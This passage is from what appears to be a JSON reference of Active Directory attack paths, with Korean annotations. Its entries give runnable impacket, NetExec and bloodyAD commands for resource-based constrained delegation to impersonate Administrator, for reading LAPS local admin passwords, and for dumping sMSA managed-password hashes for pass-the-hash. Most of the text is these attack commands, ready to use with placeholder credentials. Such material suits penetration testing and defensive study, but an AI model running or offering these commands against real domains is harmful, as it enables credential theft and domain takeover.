            "impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass 'MachinePass1!' 'corp.local/attacker:Passw0rd!'",
            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
            "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/ATTACKERPC$:MachinePass1!'"
          ]
        }
      ],
      "tools": [{"name": "impacket addcomputer/rbcd/getST", "type": "py", "url": "https://github.com/fortra/impacket"}]
    },

    "SyncLAPSPassword": {
      "ko": "LAPS 비번 동기화(DirSync) 읽기 권한",
      "priority": "high",
      "summary": "DirSync 로 대상 컴퓨터 LAPS 로컬 관리자 비번 읽기 (ReadLAPSPassword 와 유사).",
      "abuse": [
        {
          "when": "대상이 컴퓨터",
          "steps": ["LAPS 비번 조회 -> 로컬 관리자 로그인"],
          "cmd": [
            "nxc ldap dc01 -u attacker -p 'Passw0rd!' -M laps",
            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 get object 'TARGET$' --attr ms-Mcs-AdmPwd"
          ]
        }
      ],
      "tools": [{"name": "NetExec / bloodyAD", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"}]
    },

    "DumpSMSAPassword": {
      "ko": "sMSA(단독 관리 서비스 계정) 비번 읽기",
      "priority": "high",
      "summary": "msDS-ManagedPassword 읽어 sMSA NT 해시 획득 (ReadGMSAPassword 계열).",
      "abuse": [
        {
          "when": "대상이 sMSA 계정",
          "steps": ["관리 비번 덤프 -> NT 해시로 PtH"],
          "cmd": ["bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 get object 'SMSA$' --attr msDS-ManagedPassword"]
        }
      ],
      "tools": [{"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"}]
    }
  },

